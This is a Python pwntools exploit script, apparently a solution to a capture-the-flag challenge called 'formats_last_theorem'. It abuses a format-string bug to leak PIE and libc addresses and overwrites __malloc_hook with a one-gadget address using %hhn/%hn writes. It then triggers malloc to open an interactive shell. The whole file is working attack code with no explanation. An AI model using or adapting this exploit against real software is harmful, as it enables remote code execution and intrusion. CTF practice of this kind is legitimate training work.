from pwn import *

#p = process("./formats_last_theorem")
p = remote("localhost",40002)
#offset = 6
#pid = gdb.attach(p,gdbscript="")
payload = "%15$p"

p.sendlineafter("point\n",payload)
p.recvline()
a = p.recvline()
leak_pie = int(a,16)

pie_base = leak_pie - 0x81d


got_puts = pie_base+0x200fb8


payload = "AAA|%7$s" +p64(got_puts)

p.sendlineafter("point\n",payload)
p.recvline()
a = p.recvline()
leak_libc_got = u64(a.split("|")[1][:6].ljust(8,'\0'))
leak_libc = leak_libc_got - 0x80aa0



gadget_1 = leak_libc+0x4f3d5
gadget_2 = leak_libc+0x4f432
gadget_3 = leak_libc+0x10a41c

malloc_hook = leak_libc +0x3ebc30



two_bytes = gadget_2 & 0xffff
third_byte = gadget_2 & 0xff0000
third_byte = third_byte >> 16
hello_from_the_other_side =  gadget_2 & 0xffff000000
hello_from_the_other_side = hello_from_the_other_side >> 24
print hex(leak_libc)
print hex(malloc_hook)
print hex(gadget_3)

#payload_malloc_hook_override ='AAAA%'+str(jeben_en_byte-4)+"x%10$hhn"+'AAA%'+str(last_two_bytes-3-jeben_en_byte)+"x%11$hn"+p64(malloc_hook+2)+p64(malloc_hook)

the_payload = "AAAA%"+str(third_byte-4)+"x%10$hhn"+"AAA%"+str(two_bytes-third_byte-3)+"x%11$hn"+p64(malloc_hook+2)+p64(malloc_hook)

p.sendlineafter("point\n",the_payload)

final_overwrite = "AAAA%123x%10$hhn"+"AAA%"+str(hello_from_the_other_side-123-3-4)+"x%11$hn"+p64(malloc_hook+5)+p64(malloc_hook+3)

p.sendlineafter("point\n",final_overwrite)

p.recv(100000)
p.sendlineafter("point\n","%11111111x")












p.interactive()
